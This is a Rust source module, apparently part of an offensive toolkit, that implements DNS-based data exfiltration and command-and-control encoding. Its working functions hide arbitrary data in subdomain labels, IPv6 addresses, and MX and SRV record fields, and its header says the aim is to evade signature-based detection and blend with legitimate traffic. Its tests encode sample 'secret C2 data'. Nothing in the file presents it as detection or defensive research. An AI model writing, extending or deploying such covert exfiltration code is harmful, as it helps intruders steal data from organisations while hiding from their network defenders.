//! DNS record encoding tricks for data exfiltration and C2 communication.
//!
//! Provides various encoding schemes that hide data within DNS records
//! in ways that evade signature-based detection and blend with legitimate traffic.

use super::TrafficError;

/// Encoding scheme for DNS data
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DnsEncoding {
    /// Standard Base64 in TXT records (current default)
    Base64Txt,
    /// Base32 encoded in subdomain labels (< 63 chars per label)
    Base32Label,
    /// Hex encoded split across CNAME chains
    HexCname,
    /// Data hidden in A/AAAA record IP addresses
    IpAddress,
    /// NULL record type with raw binary data
    NullRecord,
    /// Encoded as MX record preferences and hostnames
    MxRecord,
    /// Data hidden in SRV record fields (priority, weight, port)
    SrvRecord,
}

/// Encode data into DNS-safe subdomain labels using base32.
/// Each label is max 63 chars, domains are max 253 chars total.
/// Returns a list of fully-qualified names to create as records.
pub fn encode_as_subdomains(data: &[u8], base_domain: &str) -> Result<Vec<String>, TrafficError> {
    // Base32 encoding: 5 bits per char, so 63 chars = 39 bytes per label
    // With 4 labels max before base domain: 4 * 39 = 156 bytes per DNS name
    let b32 = base32_encode(data);
    let label_max = 63;
    let max_labels_per_name = 4;

    let mut names = Vec::new();
    let mut offset = 0;

    while offset < b32.len() {
        let mut name_parts = Vec::new();
        for _ in 0..max_labels_per_name {
            if offset >= b32.len() {
                break;
            }
            let end = (offset + label_max).min(b32.len());
            name_parts.push(&b32[offset..end]);
            offset = end;
        }

        let subdomain = name_parts.join(".");
        let fqdn = format!("{subdomain}.{base_domain}");
        if fqdn.len() > 253 {
            return Err(TrafficError::Encoding(
                format!("FQDN exceeds 253 chars: {}", fqdn.len()),
            ));
        }
        names.push(fqdn);
    }

    Ok(names)
}

/// Decode data from base32-encoded subdomain labels
pub fn decode_from_subdomains(names: &[String], base_domain: &str) -> Result<Vec<u8>, TrafficError> {
    let suffix = format!(".{base_domain}");
    let mut b32 = String::new();

    for name in names {
        let subdomain = name.strip_suffix(&suffix)
            .ok_or_else(|| TrafficError::Encoding(format!("name doesn't end with {base_domain}")))?;
        // Remove dots between labels
        b32.push_str(&subdomain.replace('.', ""));
    }

    base32_decode(&b32)
        .ok_or_else(|| TrafficError::Encoding("base32 decode failed".into()))
}

/// Encode data as IPv4/IPv6 addresses for A/AAAA record responses.
/// Each A record holds 4 bytes, each AAAA holds 16 bytes.
pub fn encode_as_ip_addresses(data: &[u8]) -> Vec<IpRecord> {
    let mut records = Vec::new();

    // Use AAAA records (16 bytes each) for efficiency
    for chunk in data.chunks(16) {
        let mut addr = [0u8; 16];
        addr[..chunk.len()].copy_from_slice(chunk);
        // Encode length of valid data in the last byte if partial chunk
        if chunk.len() < 16 {
            addr[15] = chunk.len() as u8;
        }
        records.push(IpRecord::Aaaa(addr));
    }

    records
}

/// Decode data from IP address records
pub fn decode_from_ip_addresses(records: &[IpRecord]) -> Vec<u8> {
    let mut data = Vec::new();
    let total = records.len();

    for (i, record) in records.iter().enumerate() {
        match record {
            IpRecord::A(addr) => {
                data.extend_from_slice(addr);
            }
            IpRecord::Aaaa(addr) => {
                if i == total - 1 {
                    // Last record: check for length marker
                    let valid_len = addr[15] as usize;
                    if valid_len > 0 && valid_len < 16 {
                        data.extend_from_slice(&addr[..valid_len]);
                    } else {
                        data.extend_from_slice(addr);
                    }
                } else {
                    data.extend_from_slice(addr);
                }
            }
        }
    }

    data
}

#[derive(Debug, Clone)]
pub enum IpRecord {
    A([u8; 4]),
    Aaaa([u8; 16]),
}

impl std::fmt::Display for IpRecord {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            IpRecord::A(addr) => write!(f, "{}.{}.{}.{}", addr[0], addr[1], addr[2], addr[3]),
            IpRecord::Aaaa(addr) => {
                let parts: Vec<String> = addr.chunks(2)
                    .map(|c| format!("{:02x}{:02x}", c[0], c[1]))
                    .collect();
                write!(f, "{}", parts.join(":"))
            }
        }
    }
}

/// Encode data into MX record format (priority + hostname)
/// Priority field holds 2 bytes of data, hostname encodes more via base32
pub fn encode_as_mx_records(data: &[u8], base_domain: &str) -> Vec<MxRecord> {
    let mut records = Vec::new();

    // Each MX record: priority (2 bytes) + hostname label (~39 bytes base32)
    // Total: ~41 bytes per MX record
    for chunk in data.chunks(41) {
        let priority = if chunk.len() >= 2 {
            u16::from_le_bytes([chunk[0], chunk[1]])
        } else if chunk.len() == 1 {
            chunk[0] as u16
        } else {
            0
        };

        let hostname_data = if chunk.len() > 2 { &chunk[2..] } else { &[] };
        let label = base32_encode(hostname_data);
        let hostname = if label.is_empty() {
            base_domain.to_string()
        } else {
            format!("{label}.{base_domain}")
        };

        records.push(MxRecord { priority, hostname });
    }

    records
}

#[derive(Debug, Clone)]
pub struct MxRecord {
    pub priority: u16,
    pub hostname: String,
}

/// Encode data into SRV record fields.
/// SRV format: priority(2) weight(2) port(2) target(hostname)
/// Gives us 6 bytes in numeric fields + more in the target hostname.
pub fn encode_as_srv_records(data: &[u8], base_domain: &str) -> Vec<SrvRecord> {
    let mut records = Vec::new();

    for chunk in data.chunks(45) {
        let priority = if chunk.len() >= 2 {
            u16::from_le_bytes([chunk[0], chunk[1]])
        } else {
            0
        };
        let weight = if chunk.len() >= 4 {
            u16::from_le_bytes([chunk[2], chunk[3]])
        } else {
            0
        };
        let port = if chunk.len() >= 6 {
            u16::from_le_bytes([chunk[4], chunk[5]])
        } else {
            0
        };

        let target_data = if chunk.len() > 6 { &chunk[6..] } else { &[] };
        let label = base32_encode(target_data);
        let target = if label.is_empty() {
            base_domain.to_string()
        } else {
            format!("{label}.{base_domain}")
        };

        records.push(SrvRecord {
            priority,
            weight,
            port,
            target,
        });
    }

    records
}

#[derive(Debug, Clone)]
pub struct SrvRecord {
    pub priority: u16,
    pub weight: u16,
    pub port: u16,
    pub target: String,
}

// ─── Base32 helpers (RFC 4648, lowercase, no padding) ───

fn base32_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8] = b"abcdefghijklmnopqrstuvwxyz234567";
    let mut result = String::new();
    let mut buffer = 0u64;
    let mut bits = 0;

    for &byte in data {
        buffer = (buffer << 8) | byte as u64;
        bits += 8;
        while bits >= 5 {
            bits -= 5;
            result.push(ALPHABET[((buffer >> bits) & 0x1F) as usize] as char);
        }
    }
    if bits > 0 {
        result.push(ALPHABET[((buffer << (5 - bits)) & 0x1F) as usize] as char);
    }

    result
}

fn base32_decode(input: &str) -> Option<Vec<u8>> {
    let mut result = Vec::new();
    let mut buffer = 0u64;
    let mut bits = 0;

    for c in input.chars() {
        let val = match c {
            'a'..='z' => c as u64 - 'a' as u64,
            '2'..='7' => c as u64 - '2' as u64 + 26,
            'A'..='Z' => c as u64 - 'A' as u64, // case-insensitive
            _ => return None,
        };
        buffer = (buffer << 5) | val;
        bits += 5;
        if bits >= 8 {
            bits -= 8;
            result.push((buffer >> bits) as u8);
            buffer &= (1 << bits) - 1;
        }
    }

    Some(result)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_base32_roundtrip() {
        let data = b"Hello, World!";
        let encoded = base32_encode(data);
        let decoded = base32_decode(&encoded).unwrap();
        assert_eq!(&decoded[..data.len()], data);
    }

    #[test]
    fn test_subdomain_encoding() {
        let data = b"This is secret C2 data that needs to be encoded";
        let names = encode_as_subdomains(data, "example.com").unwrap();
        assert!(!names.is_empty());
        // All names should end with the base domain
        for name in &names {
            assert!(name.ends_with("example.com"));
            assert!(name.len() <= 253);
        }
    }

    #[test]
    fn test_subdomain_roundtrip() {
        let data = b"roundtrip test data for DNS encoding";
        let names = encode_as_subdomains(data, "test.com").unwrap();
        let decoded = decode_from_subdomains(&names, "test.com").unwrap();
        assert_eq!(&decoded[..data.len()], data);
    }

    #[test]
    fn test_ip_address_encoding() {
        let data = vec![0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
                        0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
                        0x11, 0x12, 0x13]; // 19 bytes = 1 full AAAA + 1 partial
        let records = encode_as_ip_addresses(&data);
        assert_eq!(records.len(), 2);
        let decoded = decode_from_ip_addresses(&records);
        assert_eq!(&decoded[..data.len()], &data[..]);
    }

    #[test]
    fn test_mx_record_encoding() {
        let data = b"secret data for MX records";
        let records = encode_as_mx_records(data, "example.com");
        assert!(!records.is_empty());
    }

    #[test]
    fn test_srv_record_encoding() {
        let data = b"SRV encoded secret payload";
        let records = encode_as_srv_records(data, "example.com");
        assert!(!records.is_empty());
        // First record should have valid priority/weight/port
        assert!(records[0].target.ends_with("example.com"));
    }
}
